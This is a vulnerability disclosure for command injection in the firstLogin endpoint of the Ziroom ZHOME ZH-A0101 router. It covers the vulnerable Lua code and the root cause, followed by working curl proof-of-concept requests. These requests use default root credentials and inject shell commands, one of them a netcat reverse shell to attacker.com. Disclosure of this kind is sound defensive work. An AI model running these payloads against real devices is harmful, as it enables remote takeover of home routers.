# Command Injection Vulnerability in ZHOME ZH-A0101 firstLogin via `firstLogin`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/firstLogin`
- **Affected Parameter:** `firstLogin`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                          |
| ------------------- | ----------------------------------------------- |
| Controller File     | `usr/lib/lua/luci/controller/api/zrNetwork.lua` |
| Model File          | `usr/lib/lua/luci/model/ZRapi/ZRLanWanFun.lua`  |
| Route Definition    | `zrNetwork.lua:76`                              |
| Controller Function | `setfirstLogin()`                               |
| Controller Location | line 1145-1157                                  |
| Model Function      | `ZRLanWanFun.setfirstLogin()`                   |
| Model Location      | line 844-849                                    |
| Injection Location  | `ZRLanWanFun.lua:848`                           |
| Sink                | `LuciUtil.exec()`                               |

## Vulnerable Code

Controller:

<img width="870" height="414" alt="00ea1ee6347a73a6676070051f2da26c" src="https://github.com/user-attachments/assets/bf423201-e77d-46e8-88f4-a3989668adf3" />


```lua
function setfirstLogin()
    local result = {}
    local LuciHttp = require("luci.http")
    local ZRWan = require("luci.model.ZRapi.ZRLanWanFun")

    local firstLogin = LuciHttp.formvalue("firstLogin")
    ZRWan.setfirstLogin(firstLogin)

    result["code"] = 0
    luci.http.prepare_content("application/json")
    luci.http.write_json(result)
end
```

Model:

<img width="900" height="228" alt="image" src="https://github.com/user-attachments/assets/a3d6f6f6-5f61-45c0-908e-54038e2f653e" />


```lua
function setfirstLogin(i)
    local fs = require "nixio.fs"
    local LuciUtil = require("luci.util")

    LuciUtil.exec("echo "..tostring(i).." > /etc/firstLogin")
end
```

## Root Cause

`tostring()` converts the value to a string but does not escape shell metacharacters. The `firstLogin` parameter is therefore interpreted as shell syntax when the `echo` command is executed.

## Source-to-Sink Chain

```text
POST /api/ZRnetwork/firstLogin
    |
    v
LuciHttp.formvalue("firstLogin")
    |
    v
ZRWan.setfirstLogin(firstLogin)
    |
    v
LuciUtil.exec("echo " .. tostring(i) .. " > /etc/firstLogin")
    |
    v
/bin/sh
```

## Harmless Verification Example

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "firstLogin=0;touch /tmp/vuln35" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstLogin"
```

Expected API behavior:

```json
{ "code": 0 }
```



## Impact

An authenticated attacker can execute commands through a first-login status update endpoint. The endpoint returns success and does not require a reboot to trigger the command.

## Injection Principle

Normal request:

```text
firstLogin = "0"
```

Concatenated command:

```sh
echo 0 > /etc/firstLogin
```

Injection request:

```text
firstLogin = "0;touch /tmp/vuln35"
```

Concatenated command:

```sh
echo 0;touch /tmp/vuln35 > /etc/firstLogin
```

Shell execution flow:

1. Command 1: `echo 0` → outputs "0"
2. Command 2: `touch /tmp/vuln35` → creates file
3. `> /etc/firstLogin` → redirect (overwrites `/etc/firstLogin` with empty content)

Note: `tostring()` does not filter shell metacharacters — `;`, `$()`, backticks, etc. can all be injected.

## Exploit Chain

```text
Attacker
  │
  ├─ Step 1: Obtain root credentials
  │
  ├─ Step 2: Construct HTTP POST request
  │           URL:  /cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/firstLogin
  │           Body: firstLogin=0;<COMMAND>
  │
  ├─ Step 3: LuciUtil.exec() → io.popen() → /bin/sh executes
  │           Injected command runs after the echo command
  │
  └─ Step 4: API returns {"code": 0}, no reboot required
```

## Proof of Concept

```bash
# Obtain session token
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

# PoC 1: Create file
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "firstLogin=0;touch /tmp/vuln35" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstLogin"

# PoC 2: Execute arbitrary command
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "firstLogin=0;id>/tmp/vuln35_id" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstLogin"

# PoC 3: Reverse shell
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "firstLogin=0;nc attacker.com 4444 -e /bin/sh" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstLogin"

# PoC 4: $() command substitution
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode 'firstLogin=$(touch /tmp/vuln35_dollar)' \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/firstLogin"
```

## Real Device Verification

```text
Request:  POST /api/ZRnetwork/firstLogin  firstLogin=0;touch /tmp/vuln35
Response: { "code": 0 }
SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:48 /tmp/vuln35  ✅
```
<img width="1746" height="165" alt="image" src="https://github.com/user-attachments/assets/eeccd625-fd4d-4a7d-9342-2eb9cfce4d7b" />
